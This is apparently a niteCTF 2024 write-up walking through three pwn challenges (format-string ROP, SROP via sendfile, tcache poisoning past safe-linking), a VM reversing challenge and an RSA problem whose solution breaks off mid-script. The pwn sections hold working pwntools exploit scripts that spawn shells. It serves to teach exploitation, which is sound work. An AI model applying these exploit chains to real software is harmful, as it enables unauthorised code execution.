# niteCTF 2024

It's the end of the year, which means it's time for another niteCTF!

As always, a massive thank you to [Team Cryptonite](https://cryptonitemit.in/) for hosting.

@def maxtoclevel=2

\toc

## Print the Gifts (pwn)
This challenge is a classic format string challenge, with NX, PIE, ASLR and
full RELRO enabled.
```bash
❯ pwn checksec chall
[*] '/home/wednesday/code/ctf/ctf-archives/niteCTF/2024/print_the_gifts/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
Looking at the main function in Ghidra, we see that it allows us to call `printf()` an unlimited number of times with a user-supplied format string.
```c

undefined8 main(void)

{
  long *in_FS_OFFSET;
  char yes_or_no;
  char buf [104];
  long canary;
  
  canary = in_FS_OFFSET[5];
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  while( true ) {
    yes_or_no = ' ';
    printf("What gift do you want from santa\n>");
    fgets(buf,100,stdin);
    printf("Santa brought you a ");
    printf(buf);
    puts("do you want another gift?\nEnter y or n:");
    __isoc99_scanf("%c",&yes_or_no);
    if (yes_or_no == 'n') break;
    getchar();
  }
  if (canary != in_FS_OFFSET[5]) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;

```

To start off, we first send a series of `%p`'s in our format string to leak
values off the stack. From this, we can recover the PIE base address, the `libc`
base address as well as the location of the `main()` stackframe's return
address. ```python def send_format_string(conn, payload):
conn.sendlineafter(b"What gift do you want from santa\n>", payload) prefix =
b"Santa brought you a " response = conn.recvline_startswith(prefix)[len(prefix)
:] return response


def answer_continue(conn, to_continue):
    answer = b"y" if to_continue else b"n"
    conn.sendlineafter(b"Enter y or n:", answer)

conn = connect("print-the-gifts.chals.nitectf2024.live", 1337, ssl=True)

# Step 1: Send a lot of %p's and leak values off the stack
offset_finder = b":".join(b"%p" for _ in range(100 // 3))
raw_response = send_format_string(conn, offset_finder)
for i, r in enumerate(raw_response.decode().split(":")):
    print(f"{hex(i)}: {r}")
response = [int(x, 16) if x != "(nil)" else 0 for x in raw_response.decode().split(":")]

# Address of main leaked on the stack
exe.address = response[0x13 + 5] - 0x1199
info("PIEBASE: " + hex(exe.address))

# Address of libc
libc.address = response[0x11 + 5] - 0x2724A
info("LIBC BASE: " + hex(libc.address))

# Address of current stack frame's base pointer
old_rbp = response[0x15 + 5]
ret_addr = old_rbp - 0x110
info("RETURN ADDRESS: " + hex(ret_addr))
answer_continue(conn, True)
```

Next we make liberal use of `pwntool`'s `FmtStr` class to construct an arbitrary
write primitive. To ensure that payloads remain short and that writes always
succeed, we perform writes in a cascading sequence of 2-byte nibbles rather than
attempting to write everything using a single payload.
```python
def write_primitive(baseaddress, towrite, format_string):
    for i, b in enumerate(towrite):
        format_string.write(baseaddress + i, towrite[i : i + 2])
        format_string.execute_writes()
        
def send_payload(payload):
    response = send_format_string(conn, payload)
    answer_continue(conn, True)
    return response

format_string = FmtStr(execute_fmt=send_payload)
```
Since RELRO is enabled, we use the write primitive to place a simple ROP-chain below our current stack frame, which will execute `system("/bin/sh")` when the function returns.
```python
system = libc.symbols.system
binsh = list(libc.search(b"/bin/sh"))[0]
rop = ROP(libc)
chain = b""
chain += p64(rop.rdi.address)
chain += p64(binsh)
chain += p64(rop.find_gadget(["ret"]).address)
chain += p64(libc.symbols.system)

write_primitive(ret_addr, chain, format_string)

# Exit the function to execute our ROP chain
conn.sendline(b"a")
conn.sendline(b"n")
conn.interactive()
# nite{0nLy_n4ugHty_k1d5_Use_%n}
```

## Mixed Signals (pwn)
The binary we are provided with only has ASLR and NX protections enabled,
```bash
❯ pwn checksec chal
[*] '/home/wednesday/code/ctf/ctf-archives/niteCTF/2024/mixed_signal/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
and there is also a clear buffer overflow vulnerability.
```c

void vuln(void)
{
  undefined buf [8];
  
  read(0,buf,300);
  return;
}
```
Prior to `vuln()` being called, the program will also open a file descriptor to the flag file as well as set a SECCOMP filter which restricts a lot of syscalls. 
However,  `rt_sigreturn` is allowed by the filter so SROP techniques are still available to us.

```bash
❯ seccomp-tools dump ./chal 
freakbob calling,pickup!
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000028  if (A != sendfile) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x06 0x00 0x00 0x00000000  return KILL
```
Using the buffer overflow, we first redirect execution back to the `vuln()` function so that we can read 15 bytes from stdin.
This will set `rax` to 15, which is the syscall number for `rt_sigreturn`. Afterwards, we jump to a syscall gadget to execute `rt_sigreturn`. 
```python
conn = connect("mixed-signal.chals.nitectf2024.live", 1337, ssl=True)
conn.recvline()  # connection header

rop = ROP(exe)
payload = ""
payload += p64(exe.symbols.vuln)
payload += p64(rop.find_gadget(["syscall"]).address)
```
After executing `rt_sigreturn`, we can gain control over every register by placing a `SigreturnFrame` at the top of the stack. 
To exploit this for reading the flag, we set the registers to execute `sendfile(stdout, flag_fd, 0)`, 
where `flag_fd` is the file descriptor of the flag file. On a local run this will be file descriptor 3, since the flag is the fourth
file descriptor open after `stdin, stdout, stderr`. On the remote however, the flag file descriptor will be file descriptor 5 since the remote process
also inherits two file descriptors from its parent `socat` process when it was forked.
```python
frame = SigreturnFrame()
frame.rax = constants.SYS_sendfile
frame.rdi = 1  # out_fd
frame.rsi = 5  # in_fd
frame.rdx = 0  # offset
frame.r10 = 0xFF  # count
frame.rip = rop.find_gadget(["syscall"]).address
frame.rsp = exe.got.exit
payload += bytes(frame)
```

Finally, we execute our payload, being sure to supply 15 bytes to the second call of `read()` so that `rax` is set accordingly
```python
rop_offset = 16  # offset at which we control the return address
payload = fit({rop_offset: payload}, length=300)

conn.send(payload)
conn.send(b"A" * 15)
conn.recvall()
# nite{b0b'5_s1gn4ls_h4v3_b33N_retUrN3D}
```
## Chaterine (pwn)
In this challenge, we have the ability to create, write and delete a set of heap
allocated message buffers. For exploit mitigations, full RELRO, NX and PIE are
enabled on the binary. ```bash ❯ pwn checksec chall [*]
'/home/wednesday/code/ctf/ctf-archives/niteCTF/2024/chaterine/handout/chall'
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled
PIE: PIE enabled Stripped: No

```

Looking at the `main()` function in Ghidra, we can spot a few bugs, the most
obvious of which being  a use-after-free caused by not zeroing out the message pointers after deletion.
There are also two format string vulnerabilities, one prior to the main loop, and another in the message writing functionality.
```c
void main(void)

{
  int cmp;
  char *buf;
  long in_FS_OFFSET;
  undefined4 choice;
  int index;
  char input_buffer [12];
  undefined local_2c;
  undefined8 canary;
  int index_copy;
  
  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  fgets(input_buffer,0xb,stdin);
  local_2c = 0;
  printf("Hello ");
                    /* Minor format string vulnerability */
  printf(input_buffer);
  cmp = strncmp(input_buffer,"spiderdrive",0xb);
  if (cmp != 0) {
    do {
      menu();
      __isoc99_scanf("%d",&choice);
      fflush(stdout);
      switch(choice) {
      default:
        printf("Wrong input please try again");
        break;
      case 1:
        printf("Enter index:");
        __isoc99_scanf("%d",&index);
        if ((index < 0x10) && (-1 < index)) {
          printf("Enter size:");
          __isoc99_scanf("%d",SIZE + index);
          fflush(stdout);
          index_copy = index;
          if (SIZE[index] < 0xfff) {
            buf = (char *)malloc((long)SIZE[index]);
            MESSAGES[index_copy] = buf;
          }
        }
        break;
      case 2:
        printf("Enter index:");
        __isoc99_scanf("%d",&index);
        fflush(stdout);
        if ((index < 0x10) && (-1 < index)) {
                    /* Pointer is not zeroed. Can use after free. */
          free(MESSAGES[index]);
        }
        break;
      case 3:
        printf("Enter index:");
        __isoc99_scanf("%d",&index);
        if ((index < 0x10) && (-1 < index)) {
          getchar();
          fgets(MESSAGES[index],SIZE[index],stdin);
                    /* Major format string vulnerability */
          printf(MESSAGES[index]);
          printf("has been written");
        }
        break;
      case 4:
        cmp = strncmp(input_buffer,"spiderdrive",0xb);
        if (cmp == 0) {
          printf("Welcome admin here u go ur admin access");
          system("/bin/sh");
        }
        break;
      case 5:
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
    } while( true );
  }
  printf("HAha cant let you in");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
Our goal is to exploit these vulnerabilities to modify a stack-local buffer.
To begin, we use the first format string vulnerability to leak the address of the target buffer on the stack.
```python
def send_printf(conn, name):
    conn.sendline(name)
    response = conn.recvline_startswith(b"Hello ").decode()[len(b"Hello ") :]
    return response


def create_message(conn, index, size):
    conn.sendlineafter(b">>", b"1")
    conn.sendlineafter(b"Enter index:", str(index).encode())
    conn.sendlineafter(b"Enter size:", str(size).encode())


def delete_message(conn, index):
    conn.sendlineafter(b">>", b"2")
    conn.sendlineafter(b"Enter index:", str(index).encode())


def write_message(conn, index, message):
    conn.sendlineafter(b">>", b"3")
    conn.sendlineafter(b"Enter index:", str(index).encode())
    conn.sendline(message)
    response = conn.recvline()
    return response
    
conn = connect("chaterine.chals.nitectf2024.live", 1337, ssl=True)

# Leaks a stack address, and hence address of target buffer
printf_response = send_printf(conn, b"%13$p")
target_buffer = int(printf_response, 16) - 0x148
print("&TARGET_BUFFER", hex(target_buffer))
```

Next we create a sentinel buffer at the top of the heap to prevent top-chunk consolidation.
```python
create_message(conn, 0, 0x80)
```
By writing into this buffer, we can also abuse the second format string vulnerability to read a heap address
which was was left in a register from a previous operation. This allows us to determine the base address of the heap.
```python
response = write_message(conn, 0, "%3$p")
heap_base = int(response, 16) & ((pow(2, 64) - 1) ^ 0xFFF)
print("HEAP BASE:", hex(heap_base))
```

Next we allocate two tcache-sized chunks, and free them so that the second chunk
points to the first within the tcache.
```python
create_message(conn, 1, 0x80)  #  chunk1
create_message(conn, 2, 0x80)  #  chunk2
delete_message(conn, 1)  # tcache[0x80] = chunk 1
delete_message(conn, 2)  # tcache[0x80] = chunk 2 -> chunk 1
```
Since we know the base address of the heap, we can calculate the address of
`chunk2` and hence bypass glibc's safe-linking mitigation.
```python
def protect_ptr(pos, ptr):
    # pos = location of current chunk
    # ptr = location of chunk we want to point to
    return (pos >> 12) ^ ptr
    
chunk2_pos = heap_base + 0x320
print("CHUNK 2 POS", hex(chunk2_pos))
```
Using this, we can overwrite the `fd` pointer of `chunk2` to point to the target buffer on the stack.
```python
write_message(conn, 2, p64(protect_ptr(chunk2_pos, target_buffer)))
```
After this write, the tcache now looks like this,
```text
tcache[0x80]: chunk 2 -> target buffer (on stack)
```
so by allocating two more `0x80` sized buffers, we will successfully allocate the target buffer into the `MESSAGES` array at index 4.
From there, we can write our target string directly into the target buffer, and use option `4` at the main menu to get a shell.
```python
# Now message 4 points to the target buffer
write_message(conn, 4, b"spiderdrive")

# And finally, use option 4 to get a shell
conn.sendlineafter(b">>", b"4")
conn.interactive()
# nite{P015on_IvY_m4h_G04t}
```

## Gate Keeping (rev)
This challenge implements a flag checker inside of a small virtual machine. As a
general disclaimer, the original binary is stripped of any symbols, so all names
assigned to functions, variables, registers and instructions below are ones I
chose myself and likely won't line up with your names.

The program begins with an unusual function prologue which Ghidra has a hard time dcompiling.
Looking at the assembly we see that it repeatedly subtracts from `rsp` until a desired
stackframe size is reached.
```asm
001028b8     ENDBR64
001028bc     PUSH       RBP
001028bd     MOV        RBP,RSP
001028c0     LEA        R11=>buffer.field271_0x110,[RSP + -0x8000]
         loop:                                            XREF[1]:     001028d7(j)  
001028c8     SUB        RSP,0x1000
         
001028cf     OR         qword ptr [RSP]=>buffer.field28943_0x7110,0x0
         
001028d4     CMP        RSP,R11
001028d7     JNZ        loop
```
This large stackframe is used to store a large structure, which houses the state of our virtual machine.
The program then proceeds to zero this memory, and copy a predefined sequence of instructions into the data section of the virtual machine state, preparing it for execution.
```c
memset(&buffer,0,0x8108);
program = (undefined8 *)::program;
instructions = (undefined8 *)&buffer.instructions;
                  /* Copy instructions into VM state buffer */
for (i = 0x1a7; i != 0; i = i + -1) {
  *instructions = *program;
  program = program + (ulong)zero * -2 + 1;
  instructions = instructions + (ulong)zero * -2 + 1;
}
```
The program then enters into its main loop, where the instruction pointer of the virtual machine is incremented continuously
whilst instructions are read, decoded and executed.
```c
void main_loop(vm_state *vm_state)

{
  short ip;
  
  do {
    ip = vm_state->instruction_pointer;
    vm_state->instruction_pointer = ip + 1;
    execute(vm_state,(&vm_state->instructions)[(int)ip]);
  } while( true );
}
```
The `execute()` function takes the form of a large switch statement, which dispatches the corresponding opcode implementations based on the current instruction.
```c

void execute(vm_state *state,byte instruction)

{
  if (instruction == 0xff) {
    execute_ff_syscall(state);
    return;
  }
  if (instruction != 0xdd) {
    if (instruction < 0xde) {
      if (instruction == 0xbf) {
        execute_bf_bitwise_and(state);
        return;
      }
      if (instruction < 0xc0) {
        if (instruction == 0xb9) {
          execute_b9_bitwise_or(state);
          return;
        }
        if (instruction < 0xba) {
          if (instruction < 0x99) {
            if (0x1f < instruction) {
              switch(instruction) {
              case 0x20:
                execute_20_subtraction(state);
                return;
              case 0x22:
                execute_22_cmp(state);
                return;
              case 0x24:
                execute_24_store_at_offset(state);
                return;
              case 0x26:
                execute_26_bitwise_nor(state);
                return;
              case 0x28:
                execute_28_load_immediate(state);
                return;
              case 0x2a:
                execute_2a_load_from_memory(state);
                return;
              case 0x2b:
                execute_2b_jump_if(state);
                return;
              case 0x2c:
                execute_2c_nand(state);
                return;
              case 0x30:
                execute_30_addition(state);
                return;
              case 0x5a:
                execute_5a_left_shift(state);
                return;
              case 0x5e:
                execute_5e_multiplication(state);
                return;
              case 0x67:
                execute_67_right_shift(state);
                return;
              case 0x72:
                execute_72_juggle(state);
                return;
              case 0x8f:
                execute_8f_juggle_r(state);
                return;
              case 0x91:
                execute_91_nop(state);
                return;
              case 0x98:
                execute_98_negate(state);
                return;
              }
            }
          }
          else if (instruction == 0xaa) {
            execute_aa_mov(state);
            return;
          }
        }
      }
    }
    exit_with_error();
    return;
  }
  execute_dd_atoi(state);
  return;
}
```
As a general overview, the VM implemented by the program has 
- 4 8-bit general purpose registers `r0, r1, r2, r3`.
- An 8-bit bitmap `flags` register for storing the result of comparison operations.
- A 16-bit instruction pointer.
- A 256-byte main memory region.
- A variable sized data region for storing instructions. 

Operations types are denoted using a single byte opcode, followed by one, two or
three arguments which can be registers, memory addresses or immediates.

To give a few examples, here are the VM implementations for
- the `ADD` instruction, which takes two arguments,
```c
void execute_30_addition(vm_state *vm_state)

{
  char arg1;
  char arg2;
  short ip;
  undefined reg1;
  undefined reg2;
  
  ip = vm_state->instruction_pointer;
  vm_state->instruction_pointer = ip + 1;
  reg1 = (&vm_state->instructions)[(int)ip];
  ip = vm_state->instruction_pointer;
  vm_state->instruction_pointer = ip + 1;
  reg2 = (&vm_state->instructions)[(int)ip];
  arg1 = load_from_register(vm_state,reg1);
  arg2 = load_from_register(vm_state,reg2);
  store_register(vm_state,reg1,arg2 + arg1);
  return;
}
```
- the `LOAD` instruction, which reads a value off main memory
```c
void execute_2a_load_from_memory(vm_state *vm_state)
{
  byte data;
  short ip;
  undefined reg1;
  
  ip = vm_state->instruction_pointer;
  vm_state->instruction_pointer = ip + 1;
  reg1 = (&vm_state->instructions)[(int)ip];
  ip = vm_state->instruction_pointer;
  vm_state->instruction_pointer = ip + 1;
  data = load_from_offset(vm_state,(&vm_state->instructions)[(int)ip]);
  store_register(vm_state,reg1,data);
  return;
}
```
- the `LOADIMM` instruction, which loads an immediate value into a register
```c
void execute_28_load_immediate(vm_state *vm_state)

{
  short ip;
  undefined reg1;
  
  ip = vm_state->instruction_pointer;
  vm_state->instruction_pointer = ip + 1;
  reg1 = (&vm_state->instructions)[(int)ip];
  ip = vm_state->instruction_pointer;
  vm_state->instruction_pointer = ip + 1;
  store_register(vm_state,reg1,(&vm_state->instructions)[(int)ip]);
  return;
}
```

With the understanding we now have of the virtual machine and the code it
executes, we can write ourselves a small disassembler for the flag checker
program embedded within the binary.
```python
#!/usr/bin/env python3
from enum import Enum

class Instruction(Enum):
    IO = 0xFF
    AND = 0xBF
    OR = 0xB9
    SUB = 0x20
    CMP = 0x22
    STORE = 0x24
    NOR = 0x26
    LOADIMM = 0x28
    LOAD = 0x2A
    JUMPIF = 0x2B
    NAND = 0x2C
    ADD = 0x30
    LSHIFT = 0x5A
    MUL = 0x5E
    RSHIFT = 0x67
    JUGGLE = 0x72
    JUGGLE_R = 0x8F
    NOP = 0x91
    NEG = 0x98
    MOV = 0xAA
    ATOI = 0xDD


class IOOperation(Enum):
    WRITE = 0x2E
    READ = 0x2D
    OPEN = 0x23
    EXIT = 0x25


class Register(Enum):
    R0 = 0xE1
    R1 = 0xE2
    R2 = 0xE3
    R3 = 0xE4


class Condition(Enum):
    UNCONDITIONAL = 0x0
    EQUAL = 0x1
    NOT_EQUAL = 0x2
    GREATER_THAN = 0x3
    LESS_THAN = 0x4
    BOTH_ZERO = 0x5


def disassemble():
    raw_program = bytes.fromhex(open("program.bin").read())
    program = list(raw_program)

    while program:
        print(f"    {hex(len(raw_program) - len(program))}: ", end="")
        curr = program.pop(0)
        try:
            instruction = Instruction(curr)
        except:
            continue
        match instruction:
            case Instruction.IO:
                io_type = IOOperation(program.pop(0))
                match io_type:
                    case IOOperation.WRITE:
                        print("WRITE R0, [memory:R1], R2 -> R0")
                    case IOOperation.READ:
                        print("READ R0, [memory:R1], R2 -> R0")
                    case IOOperation.OPEN:
                        print("OPEN [memory:R0] -> R0")
                    case IOOperation.EXIT:
                        print("EXIT R0")
                    case _:
                        print("Unhandled io type", io_type)
            case (
                Instruction.AND
                | Instruction.OR
                | Instruction.SUB
                | Instruction.CMP
                | Instruction.NOR
                | Instruction.NAND
                | Instruction.ADD
                | Instruction.LSHIFT
                | Instruction.MUL
                | Instruction.RSHIFT
                | Instruction.JUGGLE
                | Instruction.JUGGLE_R
                | Instruction.MOV
            ):
                arg1 = Register(program.pop(0))
                arg2 = Register(program.pop(0))
                print(f"{instruction.name} {arg1.name}, {arg2.name} -> {arg1.name}")
            case Instruction.LOADIMM:
                arg1 = Register(program.pop(0))
                arg2 = program.pop(0)
                print(f"LOADIMM {arg1.name}, {hex(arg2)} ({arg2.to_bytes()})")
            case Instruction.LOAD | Instruction.STORE:
                arg1 = Register(program.pop(0))
                arg2 = program.pop(0)
                print(f"{instruction.name} {arg1.name}, [memory:{hex(arg2)}]")
            case Instruction.JUMPIF:
                condition = Condition(program.pop(0))
                target = Register(program.pop(0))
                print(f"JUMPIF {condition.name}, {target.name}")
            case Instruction.NOP:
                print("NOP")
            case Instruction.NEG:
                arg1 = Register(program.pop(0))
                print(f"NEG {arg1.name} -> {arg1.name}")
            case _:
                print(f"Unhandled instruction", instruction)
```
Looking at the disassembled code, we see that it begins by storing the string "Enter flag:" to 
main memory before calling `write()` to print it to the console.
```
init:
    # Print "Enter flag: " to stdout
    0x0: LOADIMM R0, 0x45 (b'E')
    0x3: STORE R0, [memory:0x20]
    0x6: LOADIMM R0, 0x6e (b'n')
    0x9: STORE R0, [memory:0x21]
    0xc: LOADIMM R0, 0x74 (b't')
    0xf: STORE R0, [memory:0x22]
    0x12: LOADIMM R0, 0x65 (b'e')
    0x15: STORE R0, [memory:0x23]
    0x18: LOADIMM R0, 0x72 (b'r')
    0x1b: STORE R0, [memory:0x24]
    0x1e: LOADIMM R0, 0x20 (b' ')
    0x21: STORE R0, [memory:0x25]
    0x24: LOADIMM R0, 0x66 (b'f')
    0x27: STORE R0, [memory:0x26]
    0x2a: LOADIMM R0, 0x6c (b'l')
    0x2d: STORE R0, [memory:0x27]
    0x30: LOADIMM R0, 0x61 (b'a')
    0x33: STORE R0, [memory:0x28]
    0x36: LOADIMM R0, 0x67 (b'g')
    0x39: STORE R0, [memory:0x29]
    0x3c: LOADIMM R0, 0x3a (b':')
    0x3f: STORE R0, [memory:0x2a]
    0x42: LOADIMM R0, 0x20 (b' ')
    0x45: STORE R0, [memory:0x2b]
    0x48: LOADIMM R0, 0x1 (b'\x01')
    0x4b: LOADIMM R1, 0x20 (b' ')
    0x4e: LOADIMM R2, 0xc (b'\x0c')
    0x51: WRITE R0, [memory:R1], R2 -> R0
    0x53: LOADIMM R0, 0x69 (read_input)
    0x56: JUMPIF UNCONDITIONAL, R0
```
The program then reads `0x23` bytes from `stdin` into an array at offset `0xbf`
```
read_input:
    # Read 0x23 bytes from stdin into an array at 0xbf
    0x69: LOADIMM R0, 0x0 (b'\x00')
    0x6c: LOADIMM R1, 0xbf (b'\xbf')
    0x6f: LOADIMM R2, 0x23 (b'#')
    0x72: READ R0, [memory:R1], R2 -> R0
```
It then stores the strings "correct" and "wrong" to main memory, before beginning to mutate the input data using a sequence of bit operations.
```
store_result_strs:
    # Store "Correct" at 0x10
    0x74: LOADIMM R0, 0x43 (b'C')
    0x77: STORE R0, [memory:0x10]
    0x7a: LOADIMM R0, 0x6f (b'o')
    0x7d: STORE R0, [memory:0x11]
    0x80: LOADIMM R0, 0x72 (b'r')
    0x83: STORE R0, [memory:0x12]
    0x86: LOADIMM R0, 0x72 (b'r')
    0x89: STORE R0, [memory:0x13]
    0x8c: LOADIMM R0, 0x65 (b'e')
    0x8f: STORE R0, [memory:0x14]
    0x92: LOADIMM R0, 0x63 (b'c')
    0x95: STORE R0, [memory:0x15]
    0x98: LOADIMM R0, 0x74 (b't')
    0x9b: STORE R0, [memory:0x16]
    0x9e: LOADIMM R0, 0xa (b'\n')
    0xa1: STORE R0, [memory:0x17]
    # Store "wrong" at 0x0
    0xa4: LOADIMM R0, 0x57 (b'W')
    0xa7: STORE R0, [memory:0x0]
    0xaa: LOADIMM R0, 0x72 (b'r')
    0xad: STORE R0, [memory:0x1]
    0xb0: LOADIMM R0, 0x6f (b'o')
    0xb3: STORE R0, [memory:0x2]
    0xb6: LOADIMM R0, 0x6e (b'n')
    0xb9: STORE R0, [memory:0x3]
    0xbc: LOADIMM R0, 0x67 (b'g')
    0xbf: STORE R0, [memory:0x4]
    0xc2: LOADIMM R0, 0xa (b'\n')
    0xc5: STORE R0, [memory:0x5]
```
These operations repeat for each character of the flag, only changing slightly by incrementing a mask value. 
```
bit_ops:
    # From here, we do a series of bit operations to each character of the flag
    0xc8: LOAD R0, [memory:0xbf]
    0xcb: LOADIMM R1, 0x1 (b'\x01')
    0xce: JUGGLE_R R0, R1 -> R0
    0xd1: STORE R0, [memory:0xbf]
    0xd4: LOAD R0, [memory:0xbf]
    0xd7: LOADIMM R1, 0x3f (b'?')
    0xda: LOAD R2, [memory:0xbf]
    0xdd: NOR R2, R1 -> R2
    0xe0: NOR R0, R2 -> R0
    0xe3: NOR R1, R2 -> R1
    0xe6: NOR R0, R1 -> R0
    0xe9: NEG R0 -> R0
    0xeb: STORE R0, [memory:0xbf]
    0xee: LOAD R0, [memory:0xbf]
    0xf1: LOADIMM R1, 0x2 (b'\x02')
    0xf4: JUGGLE R0, R1 -> R0
    0xf7: STORE R0, [memory:0xbf]
    0xfa: LOAD R0, [memory:0xbf]
    0xfd: LOADIMM R1, 0xa7 (b'\xa7')
    0x100: LOAD R2, [memory:0xbf]
    0x103: NOR R2, R1 -> R2
    0x106: NOR R0, R2 -> R0
    0x109: NOR R1, R2 -> R1
    0x10c: NOR R0, R1 -> R0
    0x10f: NEG R0 -> R0
    0x111: STORE R0, [memory:0xbf]
    # End of iteration. These repeat for each character of the input
    ...
```
Finally the result of the mutation is checked against a checkstring, with the program printing "wrong" and exiting immediately if a comparison does not match.
```
check:
    # Check mutated data against a test string
    0xb2c: LOADIMM R0, 0x5f (b'_')
    0xb2f: LOAD R1, [memory:0xbf]
    0xb32: LOADIMM R2, 0x59 (wrong)
    0xb35: CMP R0, R1 -> R0
    0xb38: JUMPIF NOT_EQUAL, R2
    0xb3b: LOADIMM R0, 0xc (b'\x0c')
    0xb3e: LOAD R1, [memory:0xc0]
    0xb41: LOADIMM R2, 0x59 (wrong)
    0xb44: CMP R0, R1 -> R0
    0xb47: JUMPIF NOT_EQUAL, R2
    0xb4a: LOADIMM R0, 0xc3 (b'\xc3')
    0xb4d: LOAD R1, [memory:0xc1]
    0xb50: LOADIMM R2, 0x59 (wrong)
    0xb53: CMP R0, R1 -> R0
    0xb56: JUMPIF NOT_EQUAL, R2
    ...
```
To reverse these bit operations and find the correct flag, we can simulate the instructions and then solve for the original input using a constraint solving library such as `claripy`.
```python
#!/usr/bin/env python3
import claripy
import string
from tqdm import tqdm

def juggle_r(op, arg):
    return (op >> ((8 - (arg & 7)) & 0x1F)) | (op << (arg & 7))

def juggle(op, arg):
    return (op << ((8 - (arg & 7)) & 0x1F)) | (op >> (arg & 7))

def nor(arg1, arg2):
    return ~(arg1 | arg2)

def neg(arg):
    return ~arg + (arg == -1)

def solve():
    flag = [claripy.BVS(f"flag_{i}", 32) for i in range(0x22)]
    check = b"_\x0c\xc3\x88\xc6\x8a\xe4\x06\xd1:y\x8f\xd1\x08\\\x12\xfc\x97t\x17\xf5\xb3\xde\x84\xd9\xcc\xad\xcd\xba\xe9%I\x80n"
    solution = ""
    for i, r0 in tqdm(enumerate(flag)):
        r0 = juggle_r(r0, 1)
        r1 = 0x3F + i
        r2 = r0
        r2 = nor(r2, r1)
        r0 = nor(r0, r2)
        r1 = nor(r1, r2)
        r0 = nor(r0, r1)
        r0 = neg(r0)

        r0 = juggle(r0, 0x2)
        r1 = 0xA7 + i
        r2 = r0
        r2 = nor(r2, r1)
        r0 = nor(r0, r2)
        r1 = nor(r1, r2)
        r0 = nor(r0, r1)
        r0 = neg(r0)

        s = claripy.Solver()
        s.add(r0 & 0xFF == check[i])
        s.add(flag[i] & 0xFF == flag[i])
        if s.satisfiable():
            solution += [chr(x & 0xFF) for x in s.eval(flag[i], 20) if chr(x & 0xFF) in string.printable][0]
        else:
            print("error")
    print(solution)
    # nite{n0r_15_a_un1v3r54l_g4t3_to0!}
```

## R Stands Alone (crypto)
In this challenge, we are given one of three factors $p, q, r$ of an RSA modulus, and an equation relating the three factors.
```python
from Crypto.Util.number import *

def gen_keys():
    while True:
        a = getPrime(128)
        b = getPrime(128)
        A = a+b
        B = a-b 
        
        p = ((17*A*A*A) - (15*B*B*B) - (45*A*A*B) + (51*A*B*B)) // 8

        if isPrime(p) :
            return a, b, p
    
p, q, r = gen_keys()
e = 65537
n = p*q*r

flag = b"nite{REDACTED}"

ct = pow(bytes_to_long(flag), e, n)
print(f"{r =}")
print(f"{ct =}")

"""OUTPUT :
r = 17089720847522532186100904495372954796086523439343401190123572243129905753474678094845069878902485935983903151003792259885100719816542256646921114782358850654669422154056281086124314106159053995410679203972646861293990837092569959353563829625357193304859110289832087486433404114502776367901058316568043039359702726129176232071380909102959487599545443427656477659826199871583221432635475944633756787715120625352578949312795012083097635951710463898749012187679742033
ct = 583923134770560329725969597854974954817875793223201855918544947864454662723867635785399659016709076642873878052382188776671557362982072671970362761186980877612369359390225243415378728776179883524295537607691571827283702387054497203051018081864728864347679606523298343320899830775463739426749812898275755128789910670953110189932506526059469355433776101712047677552367319451519452937737920833262802366767252338882535122186363375773646527797807010023406069837153015954208184298026280412545487298238972141277859462877659870292921806358086551087265080944696281740241711972141761164084554737925380675988550525333416462830465453346649622004827486255797343201397171878952840759670675361040051881542149839523371605515944524102331865520667005772313885253113470374005334182380501000
"""
```
Expanding the relation in `gen_keys()` and simplifying, we arrive at the equation

\begin{equation*} r = p^3 + 16q^3, \end{equation*} where $p,q,r\in \mathbb{Z}$.
To solve this equation, we observe that $r$ can be factored using the sum of two cubes identity as
\begin{equation*} 
r = (p + \alpha q)(p^2 - \alpha pq + q^2), 
\end{equation*}
with $\alpha = \sqrt[3]{16}$. Hence if we can factor $r$ over the ring
$\mathbb{Z}[\alpha]$, we have a good chance at finding $(p + \alpha q)$ and from there
derive $p$ and $q$. This approach is a slight variation on the standard CTF
technique to solve Diophantine equations of the form 
\begin{equation*} c = a^2 +
b^2, \end{equation*} 
which is to observe that $c = (a + bi)(a - bi)$ and hence recover $a$ and $b$ by factoring $c$ over
the Gaussian integers $\mathbb{Z}[i]$.

Below is an implementation in Sagemath
```python
#!/usr/bin/env sage
from Crypto.Util.number import *

r = 17089720847522532186100904495372954796086523439343401190123572243129905753474678094845069878902485935983903151003792259885100719816542256646921114782358850654669422154056281086124314106159053995410679203972646861293990837092569959353563829625357193304859110289832087486433404114502776367901058316568043039359702726129176232071380909102959487599545443427656477659826199871583221432635475944633756787715120625352578949312795012083097635951710463898749012187679742033
